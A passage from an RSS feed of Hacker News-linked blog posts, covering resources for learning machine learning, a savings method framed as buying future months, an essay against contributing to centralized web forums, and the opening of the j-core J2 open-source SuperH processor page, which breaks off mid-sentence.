October 29, 2020 | https://renanmf.com/machine-learning-and-deep-learning-software-engineers/ | <a href="https://web.archive.org/web/*/https://renanmf.com/machine-learning-and-deep-learning-software-engineers/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Introduction</h2><p>The subject of Artificial Intelligence picks my interest and I‚Äôm constantly studying and trying new things in this field.</p><p>It is notorious how the technologies related to Natural Language Processing, Computer Vision and such have emerged and evolved into solutions used by millions of users every day.</p><p>Even though people use the term "Artificial Intelligence", we are still far away from something as advanced as a Skynet from the Terminator movies.</p><p>The most common subfield of AI used today is the one called Machine Learning, which, in its turn, has Deep Learning as subfield steeply growing every day for quite some time now.</p><p>In this guide, I aim to describe a path to follow for software engineers to begin understanding how Machine Learning works and how to apply it to your projects.</p><p>Yeah, you can just go to Google API‚Äôs or Amazon and pick some magical API to do Speech Recognition for you, but the value of knowing how it works, why it works and even more, how to make your own API as a Service and tune it to your specific needs is incredible.</p><p>Remember, as a developer, every tool is a new power.</p><p>I‚Äôve read, watched and gone through all these resources until the end, even got a paid certification for some, even though it is not necessary to learn, I find myself more engaged to finish when I have some deadline and assessment to prove I actually learned the material.</p><p>Let‚Äôs dive into the topics.</p><h2>The Basics: Math!</h2><p>Maybe you never had the chance to study some college-level math, or you did study it but you can‚Äôt remember most of the stuff because JavaScript and CSS took all the memory of those topics away.</p><p>There are 3 topics you must know beforehand, or at least have a decent grasp of to follow any good material on ML and DL: Linear Algebra, Calculus and Statistics.</p><p>If you‚Äôd like to go deep in learning the math needed to ML and DL, you can look for MIT OpenCourseWare classes like Professor Strang‚Äôs renowned <a href="https://ocw.mit.edu/courses/mathematics/18-06-linear-algebra-spring-2010/">Linear Algebra</a> class.</p><p>I‚Äôve watched it in college in parallel with my regular class and it is very good.</p><p>But, let‚Äôs face it, most people have no time for that or the patience.</p><p>So I will give you the crash course for the 3 topics mentioned above.</p><h3>Linear Algebra</h3><p>Just watch the whole series <a href="https://www.youtube.com/watch?v=fNk_zzaMoSs&amp;list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Essence of Linear Algebra</a> from the Youtube channel 3Blue1Brown.</p><p>The guy makes visual explanations of once hard concepts incredibly easy!</p><p>It is very far in terms of content compared to Professor Strang‚Äôs, but it‚Äôs enough, to begin with, and you can go after other topics as you advance in ML and DL.</p><h3>Calculus</h3><p>Guess what?</p><p>3Blue1Brown also has a whole series on Calculus on Youtube for you to watch for free: <a href="https://www.youtube.com/watch?v=WUvTyaaNkzM&amp;list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr">Essence of Calculus</a>.</p><p>Again, he is very good at giving you the intuition of why and how rather than just throw some random equations on your face.</p><h3>Statistics</h3><p>This is a whole field that, in my opinion, you can learn as needed, a good reference is <a href="https://www.amazon.com/Practical-Statistics-Data-Scientists-Essential/dp/1491952962">Practical Statistics for Data Scientists: 50 Essential Concepts</a>.</p><p>An objective book with some good examples for every concept.</p><p>Fast to read too.</p><p>As the title implies, it is more suitable for Data Scientists, but understanding some basics of statistics is always good and this is what this is book is for.</p><p>You won‚Äôt become a statistician after reading it, but you will learn some good stuff.</p><h2>The Bypassed: Machine Learning</h2><p>Everybody wants to jump straight into Deep Learning and be the cool guy training a single model for a week on a 12GB GPU.</p><p>But to get Deep Learning right, you need to go through Machine Learning first!</p><h3>Start from the beginning</h3><p>The concepts, the train of thought, the "feeling" of how things work start here and there is no one else more capable of teaching those concepts than Professor Andrew Ng in his course <a href="https://www.coursera.org/learn/machine-learning">Machine Learning</a>.</p><p>You may think this course is old and outdated, well, technology-wise, maybe, but conceptually-wise, it is better than anything else out there.</p><p>Professor Ng makes it easy to understand the math applied in every technique he teaches and gives you a solid understanding of what happens underneath in a very short and concise course.</p><p>All the exercises are made in Octave, a free version of Matlab of sorts, and you finish the course implementing your own Neural Network!</p><p>The syntax in Octave is easy to grasp for any programmer, so don‚Äôt let that be a barrier for you.</p><p>Once you finish the course, you will have implemented all the major algorithms and will be able to solve several prediction problems.</p><h3>Random Forests</h3><p>I said all the major algorithms, right?</p><p>Actually, there is but one flaw in Andrew Ng‚Äôs course, he doesn‚Äôt cover Random Forests.</p><p>An awesome complement to his course is fast.ai‚Äôs <a href="http://course18.fast.ai/ml">Introduction to Machine Learning for Coders</a>.</p><p>Jeremy Howard goes super practical on the missing piece in Ng‚Äôs course covering a topic that is, for many classical problems, the best solution out there.</p><p>Fast.ai‚Äôs approach is what is called Top-Down, meaning they show you how to solve the problem and then explain why it worked, which is the total opposite of what we are used to in school.</p><p>Jeremy also uses real-world tools and libraries, so you learn by coding in industry-tested solutions.</p><h2>Deep Learning</h2><p>Finally!</p><p>The reason why we are all here, Deep Learning!</p><p>Again, the best resource for it is Professor Ng‚Äôs course, actually, a series of courses.</p><p>The <a href="https://www.deeplearning.ai/deep-learning-specialization/">Deep Learning Specialization</a> is composed of 5 courses total going from the basics and evolving on specific topics such as language, images, and time-series data.</p><p>One nice thing is that he continues from the very end of his classical Machine Learning course, so it just feels like an extension of the first course.</p><p>The math, the concepts, the notion of how and why it works, he delivers it all very concisely like few I‚Äôve seen.</p><p>The only drawback is that he uses <a href="https://www.tensorflow.org/">Tensorflow</a> 1.x (Google‚Äôs DL Framework) in this course, but that‚Äôs minimal detail in my opinion since the explanations and exercises are so well delivered.</p><p>You can pick up the most recent version of the framework relatively easy and to do so there is the final piece of this guide, a book.</p><h3>Too much stuff, give me something faster</h3><p>This book might be the only thing you need to start, it is Aur√©lien G√©ron‚Äôs <a href="https://www.amazon.com.br/Hands-Machine-Learning-Scikit-Learn-TensorFlow-ebook/dp/B07XGF2G87">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow: Concepts, Tools, and Techniques to Build Intelligent Systems</a>.</p><p>It covers a lot, from classical Machine Learning to the most recent Deep Learning topics. Good examples and exercises using industry-grade frameworks and libraries.</p><p>I dare say that, if you are really in a rush, you can skip everything I said before and just go for the book.</p><p>You will miss a good amount of information contained on the other resources mentioned, but the practical and actionable knowledge from G√©ron‚Äôs book is enough to work on many ideas for your next project.</p><p>If you feel limited after only reading the book, go back and study the rest of the material, it will fill in the gaps you might have and give you a more solid understanding.</p><h2>What about Framework X or Y?</h2><p>"Hey, I‚Äôve heard about PyTorch and that other framework or library X everybody talks about".</p><p>As a Software Engineer, you know better than anyone how fast technology evolves.</p><p>Don‚Äôt go crazy for that, after you learn the basics in this guide, you can easily go, for instance, on <a href="https://pytorch.org/">PyTorch</a> documentation or any other library or framework of sorts and learn how to use it in a week or two.</p><p>The techniques, the concepts, are all the same, it is only a matter of syntax and application or even tastes that you might have for any given tool.</p><h2>Conclusion</h2><p>To wrap it up, I want to say that, even though it might seem a lot, I tried to remove all the noise and at the end of the process, you will feel confident that you understand what is happening behind the curtains, the jargons and even be able to read some papers published in the field to keep up with the latest advances.</p><p>TL;DR Here is the list of resources mentioned in sequence:</p><ul><li><a href="https://www.youtube.com/watch?v=fNk_zzaMoSs&amp;list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab">Essence of Linear Algebra</a></li><li><a href="https://www.youtube.com/watch?v=WUvTyaaNkzM&amp;list=PLZHQObOWTQDMsr9K-rj53DwVRMYO3t5Yr">Essence of Calculus</a></li><li><a href="https://www.coursera.org/learn/machine-learning">Machine Learning</a></li><li><a href="http://course18.fast.ai/ml">Introduction to Machine Learning for Coders</a></li><li><a href="https://www.deeplearning.ai/deep-learning-specialization/">Deep Learning Specialization</a></li><li><a href="https://www.amazon.com.br/Hands-Machine-Learning-Scikit-Learn-TensorFlow-ebook/dp/B07XGF2G87">Hands-On Machine Learning with Scikit-Learn, Keras, and TensorFlow: Concepts, Tools, and Techniques to Build Intelligent Systems</a></li></ul></div></div>]]>
            </description>
            <link>https://renanmf.com/machine-learning-and-deep-learning-software-engineers/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934686</guid>
            <pubDate>Thu, 29 Oct 2020 19:37:58 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The ‚ÄúFuture Self‚Äù Savings Method]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24934679">thread link</a>) | @uxisnotui
<br/>
October 29, 2020 | https://ozchen.com/future-self-savings-method/ | <a href="https://web.archive.org/web/*/https://ozchen.com/future-self-savings-method/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-29003" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		
<p>In 2016, I began saving up for an experiment living as a <a href="https://ozchen.com/quit-digital-nomad/" target="_blank" rel="noreferrer noopener">digital nomad</a>. It was the first time I had to seriously think about what my ‚Äúrunway‚Äù would be. How long would my money last if I were to have no income coming in, and I wanted to continue traveling? </p>



<p>I decided to take a small bets experiment, figuring that 2 months abroad would be a enough to gauge what this digital nomad life is all about.</p>



<p>I calculated my monthly expenses ‚Äì rent, food, all the big items ‚Äì and created a ‚Äútravel fund‚Äù worth at least 2 months of expenses. Even if the South American countries I was interested in had a lower cost of living, I wanted a wider margin to account for unexpected expenses like flights, having to get an emergency AirBnB, and shenanigans. </p>



<p>I came back from that trip with a little more money leftover than I had budgeted‚Ä¶and it felt good. </p>



<p>I got my first taste of buying myself future months and I wasn‚Äôt going back. </p>



<h3>Conventional financial advice promotes two extremes</h3>



<p>The typical financial advice rest on two points: </p>



<p>On one hand, build an emergency fund. Experts like <a href="https://www.daveramsey.com/blog/quick-guide-to-your-emergency-fund">Dave Ramsey</a> suggesting a starter fund of $1000.</p>



<p>On the other hand, think about retirement‚Äîwhich could be hundreds of thousands, or millions of dollars. <br></p>



<blockquote><p>Fidelity Investments recommends that ‚Äúa 40-year old should have a nest egg twice her annual income; by age 50, the egg should be four times income and at age 60, retirement savings should be six times current income.‚Äù (<a aria-label="Zacks (opens in a new tab)" rel="noreferrer noopener" href="https://finance.zacks.com/should-nest-egg-retire-4445.html" target="_blank">Zacks</a>)</p></blockquote>



<p>This super long term outlook is hard to relate to, especially for younger people starting out in the workforce, saddled with student loan debt and without much savings. </p>



<p>There needs to be an aspirational stage, something that feels more within reach between setting up an emergency fund (basic) and planning for retirement (advanced). </p>



<figure><img loading="lazy" width="960" height="367" src="https://i2.wp.com/ozchen.com/wp-content/uploads/freedom-fund-vs-emergency-fund-retirement-illustration.png?resize=960%2C367&amp;ssl=1" alt="" srcset="https://i2.wp.com/ozchen.com/wp-content/uploads/freedom-fund-vs-emergency-fund-retirement-illustration.png?w=1280&amp;ssl=1 1280w, https://i2.wp.com/ozchen.com/wp-content/uploads/freedom-fund-vs-emergency-fund-retirement-illustration.png?resize=768%2C293&amp;ssl=1 768w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></figure>



<p>According to <a href="https://www.bankrate.com/banking/savings/financial-security-march-2019/">Bankrate</a>, 21% of Americans don‚Äôt save <em>any</em> of their annual income.</p>



<p>On the contrary, ‚ÄúFour in 10 identify themselves as aggressive short-term savers, where they excel at putting money aside for a specific purpose, like a trip or wedding, but aren‚Äôt consistently setting aside money for the future.‚Äù (<a href="https://www.marketwatch.com/story/this-is-why-americans-dont-save-even-when-they-know-better-2019-02-25">MarketWatch</a>). </p>



<p>This shows that people are incentivized to save for tangible things.</p>



<p>Taking in those insights, we can apply the psychological trick of chunking: <br><strong>Simplify things by breaking them down I into digestible chunks. </strong></p>



<h3>How the Future Self Savings Method works </h3>



<p>Here‚Äôs what I found more motivating: <strong>buy myself one future month at a time.</strong> A rough calculation:</p>



<ol><li>Figure out monthly expenses. (I use the last 12 months‚Äô average)</li><li>Pad that number by 10-20%</li><li>Every time you save that number, you‚Äôve bought your future self a month!</li></ol>



<p>Let‚Äôs mull over that last point. </p>



<blockquote><p>Every time you save a month‚Äôs worth of expenses, you‚Äôve bought your future self a month of freedom.</p></blockquote>



<div><p>Say that your average living expenses is $3000.</p><p>Because we can‚Äôt predict inflation or how the value of the dollar will change, let‚Äôs pad that amount by 20%. </p></div>



<p>$3000 x 1.2 = $3600. </p>



<p>Now, every time you save $3600, you just bought your future self another month of worry-free expense.  </p>



<h3>The psychology of earning ‚Äúfinancially free‚Äù months</h3>



<p>What would it take to <strong>buy yourself a year of freedom? </strong></p>



<p>Using our previous illustration, that‚Äôd look like $3000 x 1.2 x 12 = <strong>$43,200</strong>.</p>



<p>For about the cost of a new car, you can buy yourself 1 year of freedom to being a digital nomad, try starting a small business, or explore a career change. </p>



<div><figure><img loading="lazy" width="960" height="533" src="https://i1.wp.com/ozchen.com/wp-content/uploads/future-self-savings-method-vacation-fund-calendar-budget.png?resize=960%2C533&amp;ssl=1" alt="" srcset="https://i1.wp.com/ozchen.com/wp-content/uploads/future-self-savings-method-vacation-fund-calendar-budget.png?w=1355&amp;ssl=1 1355w, https://i1.wp.com/ozchen.com/wp-content/uploads/future-self-savings-method-vacation-fund-calendar-budget.png?resize=768%2C427&amp;ssl=1 768w" sizes="(max-width: 960px) 100vw, 960px" data-recalc-dims="1"></figure></div>



<p>It‚Äôs fun to model out: <em>how fast can I buy myself future months?</em> </p>



<p>Say that someone takes home $6000 a month after taxes, and sets her ‚Äúfuture self month expenses‚Äù at a generous $3600. If she divide that budget by income, and multiply by 12, she would arrive at the number of months it takes to earn 1 year off. </p>



<figure><img loading="lazy" width="946" height="378" src="https://i2.wp.com/ozchen.com/wp-content/uploads/build-freedom-fund-calculation.jpg?resize=946%2C378&amp;ssl=1" alt="" srcset="https://i2.wp.com/ozchen.com/wp-content/uploads/build-freedom-fund-calculation.jpg?w=946&amp;ssl=1 946w, https://i2.wp.com/ozchen.com/wp-content/uploads/build-freedom-fund-calculation.jpg?resize=768%2C307&amp;ssl=1 768w" sizes="(max-width: 946px) 100vw, 946px" data-recalc-dims="1"><figcaption>( Free month number / Take home income ) x 12 = The number of months it takes to earn 1 year off</figcaption></figure>



<p>Obviously it can be difficult to save that much money (that‚Äôs a 60% savings rate). But this type of illustration can be another guidepost in figuring out personal budgets, salary raises, or just aspirational numbers for increasing income and decreasing expenses. </p>



<p><strong>Imagine that for every month you work, you‚Äôve earned yourself a free future month</strong>. </p>



<p>Now imagine that for every month you work, you‚Äôve earned yourself <strong>two</strong> future months. Whoa!</p>



<p>This idea becomes even more powerful when combined with decreasing expenses and investing your money.</p>



<p>That‚Äôs why I think saving for  <strong>financially free months</strong> is a powerful idea. </p>



<h3>Not an emergency fund, but a Freedom fund.</h3>



<p>You might be thinking: ‚Äúisn‚Äôt this just an emergency fund?‚Äù </p>



<p>A freedom fund just extends the idea of an emergency fund for aspirational purposes. </p>



<p>If you‚Äôre like me and don‚Äôt want to live a ‚Äúdeferred life‚Äù (nod to Tim Ferriss), then the Future Self Savings Method may be an motivating idea. </p>



<figure><blockquote><p><strong>Deferred life plan: </strong><br>Work your ass off for decades, then enjoy that money when you‚Äôre less able to</p><cite>YEAH, NO THANKS</cite></blockquote></figure>



<p>The Future Self Savings Method has the subtle effect of reorienting my relationship with money:</p>



<blockquote><p>[BEFORE] ‚ÄúHow much money do I want to save?‚Äù </p><p>[AFTER] ‚ÄúHow much <strong>time</strong> do I want to make?‚Äù </p></blockquote>



<p>Now, instead deferring my life decades out, I can more confidently plan on the order of months and years.</p>



<p><strong>How much much freedom do you want to have saved?</strong></p>



<hr>



<p><em>Afterwords</em></p>



<p>I haven‚Äôt studied the FIRE (financially independent, retire early) movement that closely. Maybe this is just the same thing. </p>



<p>This article may feel the most relatable to those making $75k and beyond. But I think the Future Self Savings Method is still a lot more actionable than ‚ÄúI want to be rich / a millionaire someday‚Äù </p>



<p>This reorients my relationship with money from ‚ÄúHow much money do I want to save?‚Äù to ‚ÄúHow much free time do I want in the future?‚Äù </p>



<p>Saving for a rainy day and setting yourself up with a safety net <em>is</em> crucial, especially when you consider that nearly <a href="https://www.washingtonexaminer.com/news/nearly-half-americans-live-paycheck-to-paycheck-bank-survey">half of Americans live paycheck to paycheck</a>, and more than half do not have an emergency fund that can cover 3 months of expenses. That became devastatingly clear when Covid hit and the government starting sending out $1200 checks. </p>



<p>But psychologically, an emergency fund is not that motivating. Backup plans are important, but doesn‚Äôt create aliveness.</p>


		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article></div>]]>
            </description>
            <link>https://ozchen.com/future-self-savings-method/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934679</guid>
            <pubDate>Thu, 29 Oct 2020 19:37:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Don't contribute anything relevant in web forums]]>
            </title>
            <description>
<![CDATA[
Score 177 | Comments 122 (<a href="https://news.ycombinator.com/item?id=24934569">thread link</a>) | @todsacerdoti
<br/>
October 29, 2020 | https://karl-voit.at/2020/10/23/avoid-web-forums/ | <a href="https://web.archive.org/web/*/https://karl-voit.at/2020/10/23/avoid-web-forums/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
<ul>
<li>Updates
<ul>
<li>2020-10-25 Comment by Erik</li>
</ul></li>
</ul>

<p>

If you're, for example, contributing to a <a href="https://en.wikipedia.org/wiki/Reddit">reddit</a> thread about something which is irrelevant or anything with only a short-term relevance, this article does not apply to you right now.

</p>

<p>

However, as soon as you're helping somebody solving an interesting issue, summarize your experiences with something or write anything that might be cool to be around in a couple of years as well, you do provide potential high-value content. My message to all those authors is: <b>don't use web-based forums</b>.

</p>

<p>

TL;DR: all of the content of closed, centralized services will be lost in the long run. Choose the platform you contribute to wisely now instead of learning through more large data loss events later-on.

</p>

<p>

The longer version is worth your time:

</p>

	  <header><h2>What Do I Mean With Web-Based Forums Here?</h2></header>

<p>

In this article, I'm using the term "web-based forums" as an umbrella term for closed, centralized services like <a href="https://en.wikipedia.org/wiki/Reddit">Reddit</a>, <a href="https://en.wikipedia.org/wiki/Hacker_News">Hacker News</a>, <a href="https://en.wikipedia.org/wiki/Slashdot">Slashdot</a>, Facebook, or any other web-based forum where you are able to add comments, articles, and so forth in most cases only after creating an account.

</p>

<p>

Typically, those services don't provide any possibility to extract or synchronize content. They don't offer open APIs that allow users to choose among different and open user interfaces. They are owned and operated by private companies.

</p>

<p>

Please note that when I'm going to mention more or less only reddit as an example in the next sections, this is because reddit is the only web-based forum <a href="https://www.reddit.com/user/publicvoit">I'm familiar with</a> to a certain level. This does not mean that reddit is worse than other closed, centralized web-based forums. Not at all.

</p>

	  <header><h2>So What's the Issue With Web-Based Forums?</h2></header>

<p>

There is not one issue. There are several things where web-based forums don't qualify for being a platform for quality content. Let's take a look at some of them.

</p>

<p>

I'm glad you're still reading this article and I hope you bear with me until the end of it. Most people will realize and learn about having contributed lots and lots of high-value information only when platforms are down for good. And this is what makes me really sad. It is just like you know that one building of the Library of Alexandria is going to burn down in a few years and people still bring many unique copies of high-quality books into its shelves, unaware of destroying knowledge this way.

</p>

	  <header><h3>Issue: No Backup, No Distribution</h3></header>

<p>

For reasons and examples stated <a href="https://karl-voit.at/cloud">in this article</a>, any centralized web-based service will go offline some day. Some sooner, some later. Popularity is not even a guarantee that a service gets continued, as you can see with <a href="https://killedbygoogle.com/">hundreds of (partly) very well known and used Google services that were shut down</a>. Nothing will be on the web forever. Most people are not aware of this fact. The books set on this machine are more likely to survive history than all of your reddit/Facebook/... contributions:

</p>

<figure>
<img src="https://karl-voit.at/2020/10/23/avoid-web-forums/2019-10-05T22.56.47%20Buchdruckmuseum%20-%20Linotype%20-%20Tastatur%20--%20cliparts%20typography%20history%20publicvoit%20-%20scaled%20width%20630.jpg" alt="" width="630">
<figcaption>A Linotype machine.</figcaption>
</figure>

<p>

So when you begin to be aware of this fact, you might want to think of things you can do to mitigate data loss when services are discontinued or "sunrized" as some marketing experts say.

</p>

<p>

You could, for example, back-up the data of this service. By providing the information on multiple servers, chances are high that not all of them are lost at the same time.

</p>

<p>

This requires certain properties. For example, you need to be able to duplicate the service on multiple servers. To be able to do so, you'll need not only the data but also the software that is providing access to the service. When different organization are running mirrored servers, it is required to openly share the data and software. This can be ensured by using Open Source software or at least open APIs and a business model that does not rely on keeping data and technical things a secret.

</p>

<p>

All major commercial services such as reddit, Facebook and so forth keep everything a secret that is not ultimately necessary to use their services. Their software is a secret, they don't offer open APIs or only very crippled ones, you don't have the possibility to get to the raw data. So no luck there. You do have <a href="https://en.wikipedia.org/wiki/Vendor_lock-in">a lock-in situation</a>.

</p>

<figure>
<img src="https://karl-voit.at/2020/10/23/avoid-web-forums/2020-10-23%20Oatmeal_-_reaching_people_on_the_internet%20--%20publicvoit%20-%20scaled%20width%20630.png" alt="" width="630">
<figcaption>https://theoatmeal.com/comics/reaching_people</figcaption>
</figure>

<p>

Even with personal blogs, "fragile" as they are, you are able to use the <a href="https://archive.org/web/">Wayback Machine of the Internet Archive</a> to back up your blog. For example, every page on my blog contains a link to its archive in the page footer. This ensures that you can not only browse the latest version of all of my blog articles in case of a server breakdown. This also enables you to browse all previous version, probably changed over time. Go ahead, try a few "Archive" links of my articles. If any of my articles start with an "Updates:" section, you know for sure that there are older versions accessible via the Internet Archive.

</p>

<p>

The Wayback Machine does not archive reddit threads. It can not properly back up Facebook pages. <a href="https://help.archive.org/hc/en-us/articles/360004651732-Using-The-Wayback-Machine">It's blinded by corporate secrecy</a> when it comes to archive content for the upcoming generations:

</p>

<blockquote>Why isn't the site I'm looking for in the archive?<br>
Some sites may not be included because the automated crawlers were
unaware of their existence at the time of the crawl. It's also
possible that some sites were not archived because they were password
protected, blocked by robots.txt, or otherwise inaccessible to our
automated systems. Site owners might have also requested that their
sites be excluded from the Wayback Machine.</blockquote>

<p>

Summarizing the things mentioned above: without very good support for data export, service duplication, open standards, any content you provide in closed web-based services will be lost just as <a href="https://www.nytimes.com/2019/03/19/business/myspace-user-data.html">MySpace already lost twelve years of content just so</a>, just to mention one big example.

</p>

	  <header><h3>Issue: User Interface Dictatorship</h3></header>

<p>

When you grew up only knowing centralized web-based forums, you can not imagine the many advantages of having the freedom to choose your preferred user interface. While some people might think this is a minor issue, let me explain a few examples where this makes a huge difference.

</p>

<p>

The first example starts with something that might only annoy people. With comments like on <a href="https://www.reddit.com/r/emacs/comments/hfamm7/those_who_have_tried_out_multiple_zettelkasten/fvx9vu5/">this thread</a>, you clutter up other people's interface for personal gain. It's selfish and distracts from the information consumption.

</p>

<p>

The reason why people are using such reminder bots is multi-fold. First, they don't use a proper todo management system that would be able to remind them to read a certain article in a few days. They externalize this inability to the web-based forum and all of its other users. <a href="https://karl-voit.at/tags/pim">I'm working on fixing these educational issues</a>. Secondly, there is no way to have features that you can use that do not affect other people's interface.

</p>

<p>

Consider people with visual impairment do have special needs. <a href="https://tinyurl.com/y6ncgvjt">The WHO reports</a> an estimate of 285 million people that do are visually impaired, ninety percent of them living in developing countries. Those are not numbers you can simply ignore. It is obvious that they do need different kind of interfaces. Either they have to use a high-contrast interface, highly unusual interface scaling factors, an interface that avoids certain color combinations, text-to-speech systems or <a href="https://en.wikipedia.org/wiki/Braille#Braille_reading">Braille readers</a> that are able to extract the content properly.

</p>

<p>

If a web-based services that - remember from before - does not offer proper open APIs and which does not implement said features, all those people simply can not participate and you can not profit from their knowledge and experience.

</p>

<p>

And even when you think that this is just a minority I can provide examples where everybody profits from choosing his or her own interface.

</p>

<p>

Some services are providing interfaces that aren't working properly on small displays or mobile devices in general. In these cases, without any ability to switch to an alternative app or web-page, you are locked out even with perfect eyesight.

</p>

<p>

When you're using an web-based forum that does not provide the feature that already read articles are marked or collapsed, you need to skim though a thread completely and re-read content to find out new postings when re-visiting the thread after a while. Our time should not spent on senseless tasks like this.

</p>

<p>

Alternative interfaces might provide advanced rating features based on your personal taste and choice so that you are able to filter out the most relevant articles easily and do not clutter your view with irrelevant articles at all. This is also called "scoring". It can be based on keywords, the amount of personal contributions to a longer thread, friendship relationships from your contact management, and so forth.

</p>

<p>

Some people prefer navigating using the keyboard. Either by personal taste or by physical restrictions. If the web-based centralized service only supports mouse-based navigation, you can not use this service.

</p>

<p>

I could continue with examples like that. The common theme is: when one particular centralized web-based forum is not implementing all of those nice features you need or like, you can not use them properly.

</p>

	  <header><h3>Issue: Rule Monopoly and Subjective Censorship</h3></header>

<p>

When you do live in a society with certain set of (legal) rules, providers of relevant web-based forums have to follow and enforce some of them. However, the issue is that this kind of censorship is and will always be related to a particular culture and society at a specific time.

</p>

<p>

For example, in Germany and Austria, being a <a href="https://en.wikipedia.org/wiki/Nazism">Nazi</a> is punishable by law. In the USA, freedom-loving people think fans of the human monsters that tortured and murdered millions of Jews in the Second World War need the possibility to express their personal "opinion". As you can see, there is a different point of view in-between the lines when I write about Nazis compared to an author from the USA who values "freedom of speech" higher than "being a die-hard fan of mass murders". It's a very difficult topic you can not enforce with a world-wide service.

</p>

<p>
</p></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://karl-voit.at/2020/10/23/avoid-web-forums/">https://karl-voit.at/2020/10/23/avoid-web-forums/</a></em></p>]]>
            </description>
            <link>https://karl-voit.at/2020/10/23/avoid-web-forums/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24934569</guid>
            <pubDate>Thu, 29 Oct 2020 19:27:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[J2 open processor: a clean-room open-source processor using the SuperH ISA]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24934474">thread link</a>) | @beefhash
<br/>
October 29, 2020 | https://www.j-core.org/index.html | <a href="https://web.archive.org/web/*/https://www.j-core.org/index.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>



<p><a href="#intro">Intro</a> <a href="#what">What is it</a>
<a href="#quick">Quick start</a>,

<a name="intro">
</a></p><h2><a name="intro">J2 open processor</a></h2><a name="intro">

</a><p><a name="intro">J-core is a clean-room open source processor and SOC design using the
</a><a href="http://www.shared-ptr.com/sh_insns.html">SuperH instruction set</a>,
implemented in VHDL and available royalty and patent free under a <a href="https://www.j-core.org/jcore-license.txt">BSD license</a>.</p>

<p>The rest of this page explains how to compile and install a "bitstream" file
to implement this processor in a cheap (about $50)
<a href="https://en.wikipedia.org/wiki/Field-programmable_gate_array">FPGA</a>
board, then how to build Linux for that board and boot it to a shell prompt.</p>

<p>The steps are (roughly):</p>

<ul>
<li><a href="#get_hardware">Get an FPGA board</a> (the cheapest option
we've written a build target for is the Numato Mimas v2).</li>
<li><a href="#download_bitstream">Download a bitstream</a> (or build one
yourself from our VHDL source code).</li>
<li><a href="#flash_bitstream">Flash the bitstream to onboard SPI flash</a>
(via USB).</li>
<li><a href="#vmlinux">Download vmlinux</a> (or build Linux yourself from
source) and copy it to an sdcard.</li>
<li><a href="#serial">Boot the board</a> connected to a serial terminal
(also via USB) to a Linux shell prompt.</li>
</ul>

<a name="what">
<h3>What is this processor?</h3>

</a><p><a name="what">The </a><a href="https://en.wikipedia.org/wiki/SuperH">SuperH processor</a>
is a Japanese design developed by Hitachi in the late 1990's. As a second
generation hybrid RISC design it was easier for compilers to generate good
code for than earlier RISC chips, and it recaptured much of the code density
of earlier CISC designs by using fixed length 16 bit instructions (with
32 bit register size and address space), using microcoding to allow
some instructions to perform multiple clock cycles of work. (Earlier pure
risc designs used one instruction per clock cycle even when that served
no purpose but to make the code bigger and exhaust the encoding space.)</p>

<p>Hitachi developed 4 generations of SuperH.
SH2 made it to the United states in the Sega Saturn game console, and
SH4 powered the Sega Dreamcast. They were also widely used in areas outside
the US cosumer market, such as the japanese automative industry.</p>

<p>But during the height of SuperH's development, the
<a href="https://en.wikipedia.org/wiki/1997_Asian_financial_crisis">1997 asian economic crisis</a> caused Hitachi to tighten its belt, eventually
partnering with Mitsubishi to spin off its microprocessor division
into <a href="http://www.hitachi.us/press/archive/10032002">a new company</a>
called "Renesas". This new company did not inherit the Hitachi
engineers who had designed SuperH, and Renesas' own
<a href="https://en.wikipedia.org/wiki/SuperH#SH-5">attempts at further
development on SuperH</a> didn't even interest enough customers for the result
to go ito production. Eventually Renesas moved on to new designs it had
developed entirely in-house, and SuperH receded in importance to them...
until the patents expired.</p>

<p>Then Jeff Dionne (a hardware engineer who wandered into Linux long enough
to create the <a href="http://www.uclinux.org/">uClinux</a> project back in
the 1990's, handing it off when he moved to Japan and went back to
hardware in 2003) created a new processor design compatible with the
SuperH instruction set, publicly releasing the first version under a BSD
liense in 2015. This new design is called j-core instead of superh because the
trademarks haven't expired.</p>

<p>The first j-core generation, j2, is compatible with the
<a href="https://en.wikipedia.org/wiki/SuperH#SH-2">sh2</a> instruction set,
which means Linux and gcc and such required only minor tweaking to support
this processor. Current linux, gcc, binutils, and
musl-libc versions support j-core out of the box. (QEMU supports sh4,
which is backwards compatible with sh2 userspace but requires its own
kernel.)</p>

<p>J2 adds two backported sh3 barrel shift instructions (SHAD and SHLD)
to improve compiler efficiency, and a new cmpxchg
(mnemonic CAS.L Rm, Rn, @R0 opcode 0010-nnnn-mmmm-0011,
based on the IBM 360 instruction) for futexs and SMP. Support for these
is already upstream in vanilla Linux and gcc/binutils (linux
"make ARCH=sh j2_defconfig" and gcc "./configure
--target=sh2eb-linux-muslfdpic --with-cpu=mj2").</p>

<p>In 2015 the j-core developers gave an <a href="http://events.linuxfoundation.org/sites/events/files/slides/Turtles%20all%20the%20way.pdf">introductory presentation</a> about it at Linuxcon Japan, which was
<a href="https://lwn.net/Articles/647636/">covered by Linux Weekly News</a>.
In 2016 the developers gave a j-core design walkthrough presentation at ELC
(<a href="https://www.j-core.org/talks/ELC-2016.pdf">slides</a>, <a href="https://www.youtube.com/watch?v=lZGHbMS882w">video</a>).</p>

<p>J2 is a nommu processor because sh2 (the processor in the Sega Saturn
